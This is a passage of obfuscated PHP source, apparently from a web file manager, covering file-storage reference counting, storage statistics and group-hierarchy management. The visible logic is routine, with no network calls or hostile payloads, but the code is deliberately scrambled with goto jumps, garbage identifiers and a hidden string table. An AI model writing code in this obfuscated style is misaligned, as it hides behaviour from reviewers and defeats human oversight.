b×’èåçß; BŠÇé¦º¥­: if (!$eŸƒ‚ŒÂÀƒ && !Cache::get($B©½ÅÏ›)) { $eŸƒ‚ŒÂÀƒ = !0; $cÜãó‰°‰º = IO::mkdir($Cƒİ‡âÜ); if (!IO::exist($cÜãó‰°‰º . $dá®ğÒ‘ìÔ[1598])) { IO::mkfile($cÜãó‰°‰º . $dá®ğÒ‘ìÔ[1598]); } Cache::set($B©½ÅÏ›, 1, 3600 * 2); } return $D×”®³·»; goto e‘À‘£®ê; e‘À‘£®ê: } public function makeFilePath($c†£”°Ç·Ä, $d×éÆ°ÏëÇ) { goto AÓ®éâÆâ; a£­îìŞ¦À: $D×ˆ³£‹ĞÙ = $Dî•Óù¡“ . rand_string(5) . short_id(100); $c†£”°Ç·Ä = str_replace($DĞ×öÛå‚£[8], $DĞ×öÛå‚£[79], KodIO::clear($c†£”°Ç·Ä)); if (!$c†£”°Ç·Ä) { $b±´íÆ‚–ª = $DĞ×öÛå‚£[1601]; } goto Dæ«†®ãŞ÷; AÓ®éâÆâ: $DĞ×öÛå‚£ =& $_SERVER[°Óó£ÌİóèÅ]; $b±´íÆ‚–ª = Model($DĞ×öÛå‚£[832])->get($DĞ×öÛå‚£[1599]); $Dî•Óù¡“ = KodIO::defaultIO() . date($DĞ×öÛå‚£[1600]); goto a£­îìŞ¦À; Dæ«†®ãŞ÷: switch ($b±´íÆ‚–ª) { case $DĞ×öÛå‚£[1602]: $D×ˆ³£‹ĞÙ = $D×ˆ³£‹ĞÙ . $DĞ×öÛå‚£[100] . $d×éÆ°ÏëÇ->ext($c†£”°Ç·Ä); if ($d×éÆ°ÏëÇ->ext($c†£”°Ç·Ä) == $DĞ×öÛå‚£[1536]) { $D×ˆ³£‹ĞÙ .= $DĞ×öÛå‚£[1603]; } break; case $DĞ×öÛå‚£[1604]: goto b•ÏœÁ¿ç¥; b•ÏœÁ¿ç¥: $cˆî¢ÎÎî = Model($DĞ×öÛå‚£[832])->get($DĞ×öÛå‚£[1605]); $f®À‰È¨Ş = substr(md5($DĞ×öÛå‚£[1343] . $cˆî¢ÎÎî . date($DĞ×öÛå‚£[452])), 0, 8); $Dî•Óù¡“ = KodIO::defaultIO() . date($DĞ×öÛå‚£[1606]) . $f®À‰È¨Ş . $DĞ×öÛå‚£[8]; goto CâÎ¶À¿½; dÆ„•Íâ—©: break; goto BëÜš³É—; CâÎ¶À¿½: if ($d×éÆ°ÏëÇ->ext($c†£”°Ç·Ä) == $DĞ×öÛå‚£[1536]) { $c†£”°Ç·Ä .= $DĞ×öÛå‚£[1603]; } $D²êïÒÉšª = IO::fileNameAuto($Dî•Óù¡“, $c†£”°Ç·Ä); $D×ˆ³£‹ĞÙ = $Dî•Óù¡“ . $D²êïÒÉšª; goto dÆ„•Íâ—©; BëÜš³É—: case $DĞ×öÛå‚£[1601]: break; default: break; } return $D×ˆ³£‹ĞÙ; goto fğ˜ªîÈ¸Ë; fğ˜ªîÈ¸Ë: } public function addFileByRemote($c÷¾•…«Ç¥, $Dà‡’à£ÑÆ, $aàÄÉ·»á = array()) { goto a”Æ¯ºÜÇ«; a”Æ¯ºÜÇ«: $fÎ¨÷Äœ©‚ =& $_SERVER[°Óó£ÌİóèÅ]; if (!IO::exist($c÷¾•…«Ç¥)) { return !1; } $báØèø³‘ = $aàÄÉ·»á[$fÎ¨÷Äœ©‚[168]] ? $aàÄÉ·»á[$fÎ¨÷Äœ©‚[168]] : $fÎ¨÷Äœ©‚[33]; goto c¯öÒù¬ˆ; c¯öÒù¬ˆ: $cÛÁáŞàùï = IO::hashMd5($c÷¾•…«Ç¥, $báØèø³‘); $D¥ ôÕË› = KodIO::defaultDriver(); $CèŸ…‡˜â« = array($fÎ¨÷Äœ©‚[399] => IO::size($c÷¾•…«Ç¥), $fÎ¨÷Äœ©‚[1607] => 1, $fÎ¨÷Äœ©‚[395] => $Dà‡’à£ÑÆ, $fÎ¨÷Äœ©‚[512] => $D¥ ôÕË›[$fÎ¨÷Äœ©‚[376]], $fÎ¨÷Äœ©‚[1608] => $c÷¾•…«Ç¥, $fÎ¨÷Äœ©‚[1609] => $aàÄÉ·»á[$fÎ¨÷Äœ©‚[169]] ? $aàÄÉ·»á[$fÎ¨÷Äœ©‚[169]] : IO::hashSimple($c÷¾•…«Ç¥), $fÎ¨÷Äœ©‚[1610] => $cÛÁáŞàùï ? $cÛÁáŞàùï : $báØèø³‘); goto d´éŒè²¶Ú; d´éŒè²¶Ú: if ($bÜººØÖ = $this->addFileCheckExist($CèŸ…‡˜â«[$fÎ¨÷Äœ©‚[169]], $CèŸ…‡˜â«[$fÎ¨÷Äœ©‚[168]], $CèŸ…‡˜â«[$fÎ¨÷Äœ©‚[86]])) { return $bÜººØÖ; } $C½ªÏ¯Äèô = $this->add($CèŸ…‡˜â«); return $this->find($C½ªÏ¯Äèô); goto B²ïˆğéÊä; B²ïˆğéÊä: } public function addFile($A„ Úñº, $D­Ô…’àÛ, $F’Ë´ŠÂÎõ = false) { goto C¶‘‡ïÀ; B“£ƒ‡´: $BçÏ„øÛ = $this->find($BÚŸçô¨Ä); return $BçÏ„øÛ; goto C°ìâ²‰ÌÄ; f—®÷­×ºØ: if ($BçÏ„øÛ = $this->addFileCheckExist($cóÉø©¢Ó‘, $CÔÕà÷äŞœ, $A»ÏÚó÷)) { return $BçÏ„øÛ; } $DÎÈ«Åù¾ä = $this->addFileMake($A„ Úñº, $A»ÏÚó÷, $cóÉø©¢Ó‘, $CÔÕà÷äŞœ, $D­Ô…’àÛ, $F’Ë´ŠÂÎõ); $BÚŸçô¨Ä = $this->add($DÎÈ«Åù¾ä); goto B“£ƒ‡´; C¶‘‡ïÀ: $cóÉø©¢Ó‘ = IO::hashSimple($A„ Úñº); $CÔÕà÷äŞœ = IO::hashMd5($A„ Úñº); $A»ÏÚó÷ = IO::size($A„ Úñº); goto f—®÷­×ºØ; C°ìâ²‰ÌÄ: } public function addFileMake($fÂÍÇŠÖ¯ˆ, $dÎë¹Øèôù, $dèš¥™’ò, $B¿…“ğøØã, $bª’ËØàÙ, $DŞ˜«ôÇğ«) { $D™àµµáí =& $_SERVER[°Óó£ÌİóèÅ]; $DëÃÃïëÇ“ = $this->createFileName($bª’ËØàÙ); if ($DŞ˜«ôÇğ«) { IO::move($fÂÍÇŠÖ¯ˆ, $DëÃÃïëÇ“); } else { IO::copy($fÂÍÇŠÖ¯ˆ, $DëÃÃïëÇ“); } $E®Ê»ˆª­ = KodIO::defaultDriver(); $eÈ±µßÄ´ = array($D™àµµáí[399] => $dÎë¹Øèôù, $D™àµµáí[1607] => 1, $D™àµµáí[395] => $bª’ËØàÙ, $D™àµµáí[512] => $E®Ê»ˆª­[$D™àµµáí[376]], $D™àµµáí[1608] => $DëÃÃïëÇ“, $D™àµµáí[1609] => $dèš¥™’ò, $D™àµµáí[1610] => $B¿…“ğøØã); return $eÈ±µßÄ´; } public function addFileCheckExist($Cªİœ¦ğíÑ, $E·†˜‚¸Ó, $fšÎä¢‚é¸) { $d›ĞËÚ¢„ö =& $_SERVER[°Óó£ÌİóèÅ]; $fÂÙíÈò³± = $this->findByHash($Cªİœ¦ğíÑ, $E·†˜‚¸Ó); if (!$fÂÙíÈò³±) { return !1; } $DìÎ©¢¯â³ = array($d›ĞËÚ¢„ö[1607] => intval($fÂÙíÈò³±[$d›ĞËÚ¢„ö[1611]]) + 1, $d›ĞËÚ¢„ö[399] => $fšÎä¢‚é¸); $this->where(array($d›ĞËÚ¢„ö[398] => $fÂÙíÈò³±[$d›ĞËÚ¢„ö[390]]))->save($DìÎ©¢¯â³); return $fÂÙíÈò³±; } public function remove($bäÏ‘Ÿ¦ˆ–) { $this->linkCountChange($bäÏ‘Ÿ¦ˆ–, !1); $this->clearEmpty(); return !0; } public function linkAdd($B°¥·ºæ£‹) { $this->linkCountChange($B°¥·ºæ£‹, !0); } public function linkCountChange($dÈøŒ«ºÏ„, $c‹¤‡¨›Ñ±) { goto C‹Ê±¦„¹Œ; C‹Ê±¦„¹Œ: $b·Òš£‰¸¢ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$dÈøŒ«ºÏ„) { return; } if (!is_array($dÈøŒ«ºÏ„)) { $dÈøŒ«ºÏ„ = array($dÈøŒ«ºÏ„); } goto A£×””°ÈÅ; A£×””°ÈÅ: $c»ßñƒ‰Õ = array(); foreach ($dÈøŒ«ºÏ„ as $eº«ó¼ˆù„) { $F–òŠŞëâù = $eº«ó¼ˆù„ . $b·Òš£‰¸¢[33]; if (!$c»ßñƒ‰Õ[$F–òŠŞëâù]) { $c»ßñƒ‰Õ[$F–òŠŞëâù] = 0; } $c»ßñƒ‰Õ[$F–òŠŞëâù]++; } $dÙ¸ôÁÊôà = array(); goto B‡õõªÊ‘; B‡õõªÊ‘: foreach ($c»ßñƒ‰Õ as $eº«ó¼ˆù„ => $Bô‰İßƒæá) { $F–òŠŞëâù = $Bô‰İßƒæá . $b·Òš£‰¸¢[33]; if (!$dÙ¸ôÁÊôà[$F–òŠŞëâù]) { $dÙ¸ôÁÊôà[$F–òŠŞëâù] = array(); } $dÙ¸ôÁÊôà[$F–òŠŞëâù][] = $eº«ó¼ˆù„; } foreach ($dÙ¸ôÁÊôà as $Bô‰İßƒæá => $bÌ”Á‹»äÔ) { if (!$bÌ”Á‹»äÔ) { continue; } $Bô‰İßƒæá = $c‹¤‡¨›Ñ± ? $Bô‰İßƒæá : -intval($Bô‰İßƒæá); $dØƒ¼ìî¬» = array($b·Òš£‰¸¢[390] => array($b·Òš£‰¸¢[7], $bÌ”Á‹»äÔ)); if ($Bô‰İßƒæá < 0) { $dØƒ¼ìî¬»[$b·Òš£‰¸¢[1611]] = array($b·Òš£‰¸¢[696], abs($Bô‰İßƒæá)); } $this->where($dØƒ¼ìî¬»)->setAdd($b·Òš£‰¸¢[1611], $Bô‰İßƒæá); } goto aÖ¼éÖ®¸‘; aÖ¼éÖ®¸‘: } public function findByHash($dƒ‚ŞõÍà, $Fˆ”¹Šœ® = false) { $Eà±‡óó» =& $_SERVER[°Óó£ÌİóèÅ]; $C°¬×ğÛ”ä = array($Eà±‡óó»[1609] => $dƒ‚ŞõÍà); if ($Fˆ”¹Šœ®) { $C°¬×ğÛ”ä = array($Eà±‡óó»[1610] => $Fˆ”¹Šœ®); } return $this->order($Eà±‡óó»[1612])->where($C°¬×ğÛ”ä)->find(); } public function clearEmpty($eøŒˆˆ‡»˜ = 0) { goto FßÛ½Ú¤˜; dù´Ç¢©ñæ: foreach ($c³™æ‚¼¦ï as $a·ŞÌğ½ÕÓ) { $E³ó‚ë ¹->update(1); $this->resetFile($a·ŞÌğ½ÕÓ); } $E³ó‚ë ¹->end(); goto c¥Ì¨ï¹À; b¹‡®Çì: $c³™æ‚¼¦ï = $this->where($b˜ÌÌ†è‘Ø)->select(); if (!$c³™æ‚¼¦ï) { return; } $E³ó‚ë ¹ = new Task($dîĞ¨á‚š¼[1614], $dîĞ¨á‚š¼[33], count($c³™æ‚¼¦ï)); goto dù´Ç¢©ñæ; FßÛ½Ú¤˜: $dîĞ¨á‚š¼ =& $_SERVER[°Óó£ÌİóèÅ]; $cÅç¸¸‹Á‘ = time() - 3600 * 24 * $eøŒˆˆ‡»˜; $b˜ÌÌ†è‘Ø = $dîĞ¨á‚š¼[1613] . $cÅç¸¸‹Á‘; goto b¹‡®Çì; c¥Ì¨ï¹À: } public function refreshData() { goto FÏò¬¹›ôÒ; BµäªÚ¿Â: if (!$cÜå«‘˜â“) { return; } $A¥º‹Àøšœ = new Task($E±ô¯ßÄï[1615], $E±ô¯ßÄï[33], count($cÜå«‘˜â“)); foreach ($cÜå«‘˜â“ as $D—×ê»’¬”) { $A¥º‹Àøšœ->update(1); if ($this->removeNotExist($D—×ê»’¬”)) { continue; } $this->resetFile($D—×ê»’¬”); } goto fÇÃØÑØ„Š; FÏò¬¹›ôÒ: $E±ô¯ßÄï =& $_SERVER[°Óó£ÌİóèÅ]; $this->refreshSourceHistory(); $cÜå«‘˜â“ = $this->select(); goto BµäªÚ¿Â; fÇÃØÑØ„Š: $A¥º‹Àøšœ->end(); $this->clearEmpty(); goto b‰£¬‚‡âã; b‰£¬‚‡âã: } private function resetFile($fòÎÒº²î) { goto DºÉÜñÏ¹†; E»¸âóèÙ: $B¤œ²ÅÕ·ø = Model($eŸ˜“‹º³·[1616])->where($bø°ê³óĞ¡)->count(); $F›ªõËİ¦‹ = intval($f÷Ö¢Â‡‹È) + intval($B¤œ²ÅÕ·ø); if ($F›ªõËİ¦‹ == 0) { IO::remove($fòÎÒº²î[$eŸ˜“‹º³·[84]]); $this->where($bø°ê³óĞ¡)->delete(); return; } goto fÁ‰Æ¤®äÌ; DºÉÜñÏ¹†: $eŸ˜“‹º³· =& $_SERVER[°Óó£ÌİóèÅ]; $bø°ê³óĞ¡ = array($eŸ˜“‹º³·[398] => $fòÎÒº²î[$eŸ˜“‹º³·[390]]); $f÷Ö¢Â‡‹È = Model($eŸ˜“‹º³·[852])->where($bø°ê³óĞ¡)->count(); goto E»¸âóèÙ; fÁ‰Æ¤®äÌ: if ($fòÎÒº²î[$eŸ˜“‹º³·[1611]] != $F›ªõËİ¦‹) { $this->where($bø°ê³óĞ¡)->save(array($eŸ˜“‹º³·[1607] => $F›ªõËİ¦‹)); } goto a™Â…©â’Â; a™Â…©â’Â: } private function removeNotExist($c»¡›õ¥­²) { goto Dñ°…ÕÛÊ; e™˜¡î¼õœ: return !0; goto cùÅ‡§Í‰Ô; eß¢Æ¡ŒÒé: $B£Ï»×†˜„ = array($eÒ¬‹Î–¥ß[398] => $c»¡›õ¥­²[$eÒ¬‹Î–¥ß[390]]); Model($eÒ¬‹Î–¥ß[852])->where($B£Ï»×†˜„)->delete(); Model($eÒ¬‹Î–¥ß[1616])->where($B£Ï»×†˜„)->delete(); goto e™˜¡î¼õœ; Dñ°…ÕÛÊ: $eÒ¬‹Î–¥ß =& $_SERVER[°Óó£ÌİóèÅ]; if (IO::exist($c»¡›õ¥­²[$eÒ¬‹Î–¥ß[84]])) { return !1; } $this->remove($c»¡›õ¥­²[$eÒ¬‹Î–¥ß[390]]); goto eß¢Æ¡ŒÒé; cùÅ‡§Í‰Ô: } private function refreshSourceHistory() { $C×â¨Ãõ†¡ =& $_SERVER[°Óó£ÌİóèÅ]; $D÷İ†ˆ³•™ = Model($C×â¨Ãõ†¡[1617])->select(); if (!$D÷İ†ˆ³•™) { return; } foreach ($D÷İ†ˆ³•™ as $BÍãÎöƒòÔ) { $F’è¤à«– = array($C×â¨Ãõ†¡[423] => $BÍãÎöƒòÔ[$C×â¨Ãõ†¡[382]]); if (!Model($C×â¨Ãõ†¡[852])->where($F’è¤à«–)->find()) { Model($C×â¨Ãõ†¡[1617])->where($F’è¤à«–)->delete(); } } } public function storageInfo($A£Ü¶†·÷ò = false) { goto c…ßŒ›ì; c…ßŒ›ì: $FéòÓĞ‚ =& $_SERVER[°Óó£ÌİóèÅ]; $Aªœ‰®¿Â = $this->count() + 0.0; $Bòğ¥Í´ª½ = 0; goto D™è¬ˆñ± ; D™è¬ˆñ± : $Bî’Æò•Š = 1; $cÔ¬Ù’¤Î = 0; $D¯Åš·İä = 5000; goto c“õ¥ã†ĞØ; c“õ¥ã†ĞØ: for ($D„Ø²²‘¢ = 0; $D„Ø²²‘¢ < $Aªœ‰®¿Â; $D„Ø²²‘¢ = $D„Ø²²‘¢ + $D¯Åš·İä) { $e ©¤Ô•© = $this->limit($D„Ø²²‘¢, $D„Ø²²‘¢ + $D¯Åš·İä)->select(); foreach ($e ©¤Ô•© as $E÷ĞñˆØ¤Î) { $Bî’Æò•Š += $E÷ĞñˆØ¤Î[$FéòÓĞ‚[86]] * $E÷ĞñˆØ¤Î[$FéòÓĞ‚[1611]]; $Bòğ¥Í´ª½ += $E÷ĞñˆØ¤Î[$FéòÓĞ‚[86]] * ($E÷ĞñˆØ¤Î[$FéòÓĞ‚[1611]] - 1); $cÔ¬Ù’¤Î += $E÷ĞñˆØ¤Î[$FéòÓĞ‚[1611]]; } } $bîÚºÁ „ˆ = array($FéòÓĞ‚[1618] => $Bî’Æò•Š, $FéòÓĞ‚[1619] => $Bòğ¥Í´ª½, $FéòÓĞ‚[1620] => $Bòğ¥Í´ª½ / $Bî’Æò•Š, $FéòÓĞ‚[90] => $Aªœ‰®¿Â, $FéòÓĞ‚[1621] => $cÔ¬Ù’¤Î); return $bîÚºÁ „ˆ; goto FÁÔ©è‘ÛŠ; FÁÔ©è‘ÛŠ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\x61\155\x65" => "\x67\162\157\165\x70\x5f\155\x65\164\x61", "\x6d\x65\x74\141\x46\151\x65\x6c\x64" => "\x67\x72\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($CÁ¼Ó‹¸ƒ) { $EŸŠèÚÑ  =& $_SERVER[°Óó£ÌİóèÅ]; return array($EŸŠèÚÑ [1622] => array($CÁ¼Ó‹¸ƒ[0], $EŸŠèÚÑ [1623]), $EŸŠèÚÑ [1624] => array($CÁ¼Ó‹¸ƒ[0], $EŸŠèÚÑ [1623])); } protected function getInfo($cÕßÕ²¿ãõ) { $aÂß—ÓÚœ = $this->getInfoSimple($cÕßÕ²¿ãõ); if (!$aÂß—ÓÚœ) { return !1; } return $this->_listDataApplyItem($aÂß—ÓÚœ); } protected function getInfoSimple($DÛÜùïÀğø, $b³ˆ¡‚‘Ç¥ = false) { $D›î‡ãº¯£ =& $_SERVER[°Óó£ÌİóèÅ]; if ($b³ˆ¡‚‘Ç¥) { $B÷Íâ‰Ú‰ä = array($D›î‡ãº¯£[1546] => intval($DÛÜùïÀğø)); return $this->where($B÷Íâ‰Ú‰ä)->find(); } return $this->cacheFunctionGet($D›î‡ãº¯£[1625], $DÛÜùïÀğø); } protected function groupAdd($aŒßŒ‰Ö„) { goto e³ìï½Œ²; e³ìï½Œ²: $c÷‹‡§Ç˜Ú =& $_SERVER[°Óó£ÌİóèÅ]; if (!$aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[392]] && isset($aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[1546]]) && $aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[1546]] == 1) { if ($DˆšÓÉ±Ô  = $this->getInfoSimple($aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[1546]], !0)) { return $aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[1546]]; } } else { $DˆšÓÉ±Ô  = $this->getInfoSimple($aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[392]]); if (!$DˆšÓÉ±Ô ) { return !1; } } $aë÷‡ËÍ÷™ = $c÷‹‡§Ç˜Ú[1626]; goto c‚Ÿ­óĞÚª; c‚Ÿ­óĞÚª: if ($DˆšÓÉ±Ô [$c÷‹‡§Ç˜Ú[381]]) { $aë÷‡ËÍ÷™ = $DˆšÓÉ±Ô [$c÷‹‡§Ç˜Ú[381]] . $DˆšÓÉ±Ô [$c÷‹‡§Ç˜Ú[1546]] . $c÷‹‡§Ç˜Ú[47]; } $EŞÈ†ŠÎáğ = array($c÷‹‡§Ç˜Ú[395] => $this->groupNameAuto($aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[392]], $aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[28]]), $c÷‹‡§Ç˜Ú[406] => $aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[392]], $c÷‹‡§Ç˜Ú[407] => $aë÷‡ËÍ÷™, $c÷‹‡§Ç˜Ú[1627] => $aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[1530]], $c÷‹‡§Ç˜Ú[1628] => 0, $c÷‹‡§Ç˜Ú[1550] => 0); if (!empty($aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[1546]])) { $EŞÈ†ŠÎáğ[$c÷‹‡§Ç˜Ú[1546]] = $aŒßŒ‰Ö„[$c÷‹‡§Ç˜Ú[1546]]; } goto e­åÕãê„¯; e­åÕãê„¯: $a‚·÷´ˆ¥Ø = $this->add($EŞÈ†ŠÎáğ); $this->setNamePinyin($a‚·÷´ˆ¥Ø, $EŞÈ†ŠÎáğ[$c÷‹‡§Ç˜Ú[28]]); Model($c÷‹‡§Ç˜Ú[852])->groupRootAdd($a‚·÷´ˆ¥Ø); goto d‡Ñ„§Îæµ; d‡Ñ„§Îæµ: return $a‚·÷´ˆ¥Ø; goto E¯œ°É«´ˆ; E¯œ°É«´ˆ: } protected function groupEdit($b‹ÀÂµ©ê†, $Fö­ÊÙŠ‘©) { $c¤Áêæç³– =& $_SERVER[°Óó£ÌİóèÅ]; if (!empty($Fö­ÊÙŠ‘©[$c¤Áêæç³–[392]])) { $e¦¡·ä…Í¼ = $this->getInfoSimple($b‹ÀÂµ©ê†); $cŠ†¬ÌŒÙ = $this->getInfoSimple($Fö­ÊÙŠ‘©[$c¤Áêæç³–[392]]); if (!$e¦¡·ä…Í¼ || !$cŠ†¬ÌŒÙ) { return !1; } if ($Fö­ÊÙŠ‘©[$c¤Áêæç³–[392]] != $e¦¡·ä…Í¼[$c¤Áêæç³–[392]]) { if ($cŠ†¬ÌŒÙ[$c¤Áêæç³–[381]] !== $e¦¡·ä…Í¼[$c¤Áêæç³–[381]] && strpos($cŠ†¬ÌŒÙ[$c¤Áêæç³–[381]], $e¦¡·ä…Í¼[$c¤Áêæç³–[381]]) === 0) { return !1; } $Fö­ÊÙŠ‘©[$c¤Áêæç³–[407]] = $cŠ†¬ÌŒÙ[$c¤Áêæç³–[381]] . $Fö­ÊÙŠ‘©[$c¤Áêæç³–[392]] . $c¤Áêæç³–[47]; $this->_changeChildLevel($e¦¡·ä…Í¼, $cŠ†¬ÌŒÙ); } } if (isset($Fö­ÊÙŠ‘©[$c¤Áêæç³–[28]])) { $this->setNamePinyin($b‹ÀÂµ©ê†, $Fö­ÊÙŠ‘©[$c¤Áêæç³–[28]]); } return $this->where(array($c¤Áêæç³–[1629] => $b‹ÀÂµ©ê†))->save($Fö­ÊÙŠ‘©); } private function _changeChildLevel($CÕŸ‚íÈµ¸, $AÇ”Ïš«×, $D…áì”âìÊ = false) { goto dƒÊì«³‘†; bÔñ¤÷ÒÄˆ: if ($D…áì”âìÊ) { $b½ŸƒïŸ¯— = $AÇ”Ïš«×[$e‡â½ô—œ[381]] . $AÇ”Ïš«×[$e‡â½ô—œ[1546]] . $e‡â½ô—œ[47]; } $bÚ‹©ğ¾¤¾ = array($e‡â½ô—œ[407] => array($e‡â½ô—œ[416], $CÕŸ‚íÈµ¸[$e‡â½ô—œ[381]] . $CÕŸ‚íÈµ¸[$e‡â½ô—œ[1546]] . $e‡â½ô—œ[417])); $D¨ƒÕ²ùÕ = array($e‡â½ô—œ[407] => array($e‡â½ô—œ[422], "\162\145\x70\x6c\141\x63\145\x28\x70\141\x72\x65\156\x74\114\x65\x76\145\x6c\x2c\x27{$cìß‡¬´Ó×}\47\x2c\x27{$b½ŸƒïŸ¯—}\47\x29")); goto aÅŸšµå; aÅŸšµå: $this->where($bÚ‹©ğ¾¤¾)->data($D¨ƒÕ²ùÕ)->save(); goto B‰áçãëÎª; dƒÊì«³‘†: $e‡â½ô—œ =& $_SERVER[°Óó£ÌİóèÅ]; $cìß‡¬´Ó× = $CÕŸ‚íÈµ¸[$e‡â½ô—œ[381]] . $CÕŸ‚íÈµ¸[$e‡â½ô—œ[1546]] . $e‡â½ô—œ[47]; $b½ŸƒïŸ¯— = $AÇ”Ïš«×[$e‡â½ô—œ[381]] . $AÇ”Ïš«×[$e‡â½ô—œ[1546]] . $e‡â½ô—œ[47] . $CÕŸ‚íÈµ¸[$e‡â½ô—œ[1546]] . $e‡â½ô—œ[47]; goto bÔñ¤÷ÒÄˆ; B‰áçãëÎª: } public function setNamePinyin($CÇ´†É„øˆ, $fêÖÈµ·ø = false) { $CÒÈİ›İ™‚ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$fêÖÈµ·ø) { $bÁ“öÖÑ = $this->getInfoSimple($CÇ´†É„øˆ); $fêÖÈµ·ø = $bÁ“öÖÑ[$CÒÈİ›İ™‚[28]]; } if (!Input::check($fêÖÈµ·ø, $CÒÈİ›İ™‚[411])) { $this->metaSet($CÇ´†É„øˆ, $CÒÈİ›İ™‚[412], null); $this->metaSet($CÇ´†É„øˆ, $CÒÈİ›İ™‚[413], null); return; } $Fòš«¸·í¹ = array($CÒÈİ›İ™‚[412] => str_replace($CÒÈİ›İ™‚[50], $CÒÈİ›İ™‚[33], Pinyin::encode($fêÖÈµ·ø)), $CÒÈİ›İ™‚[413] => Pinyin::encode($fêÖÈµ·ø, $CÒÈİ›İ™‚[414])); $this->metaSet($CÇ´†É„øˆ, $Fòš«¸·í¹); } protected function groupRemove($AÖôå¸œ´) { goto fˆèØ¬¯¯Ğ; AÎ“ÌˆªïÁ: $this->where(array($b»Ÿ¡Âä’[392] => $AÖôå¸œ´))->save(array($b»Ÿ¡Âä’[392] => $f šĞÑì¼Å[$b»Ÿ¡Âä’[392]])); Model($b»Ÿ¡Âä’[1630])->where($AÆ«Òšù»¿)->delete(); Model($b»Ÿ¡Âä’[1631])->where($AÆ«Òšù»¿)->delete(); goto Dˆ«ÂØš; fˆèØ¬¯¯Ğ: $b»Ÿ¡Âä’ =& $_SERVER[°Óó£ÌİóèÅ]; $AÆ«Òšù»¿ = array($b»Ÿ¡Âä’[1546] => $AÖôå¸œ´); $f šĞÑì¼Å = $this->where($AÆ«Òšù»¿)->find(); goto eÔËÀÁµÌ; Dˆ«ÂØš: Model($b»Ÿ¡Âä’[529])->groupRootRemove($AÖôå¸œ´); return $this->where($AÆ«Òšù»¿)->delete(); goto aÙŠ²Ô‰Ñ°; eÔËÀÁµÌ: if (!$f šĞÑì¼Å || $f šĞÑì¼Å[$b»Ÿ¡Âä’[392]] == 0) { return !1; } $BŒŒÉ«—Œ® = $this->getInfoSimple($f šĞÑì¼Å[$b»Ÿ¡Âä’[392]]); $this->_changeChildLevel($f šĞÑì¼Å, $BŒŒÉ«—Œ®, !0); goto AÎ“ÌˆªïÁ; aÙŠ²Ô‰Ñ°: } public function listData() { $Aİß‹ÒÌï = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Aİß‹ÒÌï[$_SERVER[°Óó£ÌİóèÅ][364]]); return $Aİß‹ÒÌï; } private function _makeOrder($d½êòÁÉ = '') { goto EÛë‘ÔÖÎ½; dáÀèï»´: $bÔèìÂã¦× = Input::get($dÍ‰ÍÁ£ŠÁ[1586], $dÍ‰ÍÁ£ŠÁ[7], $dÍ‰ÍÁ£ŠÁ[1629], $b†óÁé’åÖ); $DˆŞĞÜ˜áÇ = Input::get($dÍ‰ÍÁ£ŠÁ[1588], $dÍ‰ÍÁ£ŠÁ[7], $dÍ‰ÍÁ£ŠÁ[1634], array($dÍ‰ÍÁ£ŠÁ[1634], $dÍ‰ÍÁ£ŠÁ[1513])); $DˆŞĞÜ˜áÇ = $fèÇ«ê¥Ó[$DˆŞĞÜ˜áÇ]; goto bÉˆ¦‰†ßÏ; bÉˆ¦‰†ßÏ: $d½êòÁÉ = $d½êòÁÉ . "{$bÔèìÂã¦×}\x20{$DˆŞĞÜ˜áÇ}\54\x20\x67\x72\157\165\x70\x49\x44\40\x61\x73\143"; return $this->order($d½êòÁÉ); goto E­Šù®ó‡Ö; EÛë‘ÔÖÎ½: $dÍ‰ÍÁ£ŠÁ =& $_SERVER[°Óó£ÌİóèÅ]; $b†óÁé’åÖ = array($dÍ‰ÍÁ£ŠÁ[1546], $dÍ‰ÍÁ£ŠÁ[28], $dÍ‰ÍÁ£ŠÁ[1532], $dÍ‰ÍÁ£ŠÁ[195]); $fèÇ«ê¥Ó = array($dÍ‰ÍÁ£ŠÁ[1632] => $dÍ‰ÍÁ£ŠÁ[1633], $dÍ‰ÍÁ£ŠÁ[1513] => $dÍ‰ÍÁ£ŠÁ[1590]); goto dáÀèï»´; E­Šù®ó‡Ö: } public function listChild($B³ìÌÚ±µ) { $A‡ÊÂŒÏÎá =& $_SERVER[°Óó£ÌİóèÅ]; $AâÏÇ‹‘Ì– = $this->where(array($A‡ÊÂŒÏÎá[392] => $B³ìÌÚ±µ))->_makeOrder()->selectPage(200); $this->_listDataApply($AâÏÇ‹‘Ì–[$A‡ÊÂŒÏÎá[364]]); return $AâÏÇ‹‘Ì–; } public function listByID($F»÷·ÕÁÇ) { $eõ˜°„ÒÙ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$F»÷·ÕÁÇ) { return array(); } $AÂäœÂê¼ß = array($eõ˜°„ÒÙ[1546] => array($eõ˜°„ÒÙ[7], $F»÷·ÕÁÇ)); $EøàÎİæãî = $this->where($AÂäœÂê¼ß)->select(); $this->_listDataApply($EøàÎİæãî); return $EøàÎİæãî; } public function listSearch($a…’Ì×ïÛĞ) { goto d‰¥ÁÔğˆ; D»·Ö´§ÃŠ: $FÆÓ‹Ó›ë = $this->_makeOrder()->where($BØ ©Ë¶Êë)->selectPage(20); $FÆÓ‹Ó›ë = $FÆÓ‹Ó›ë ? $FÆÓ‹Ó›ë : array(); if (!$FÆÓ‹Ó›ë || count($FÆÓ‹Ó›ë[$BãƒõôÖì[364]]) < 5 && Input::check($d×ÓéÙáÅÑ, $BãƒõôÖì[317])) { $DÒ¥ó¶ò = $this->_searchFromMeta($BãƒõôÖì[413], $d×ÓéÙáÅÑ, 10); $e…Š¹ù£† = $this->_searchFromMeta($BãƒõôÖì[412], $d×ÓéÙáÅÑ, 10); $f”ƒÇ’šÜÌ = array_merge($DÒ¥ó¶ò, $e…Š¹ù£†, 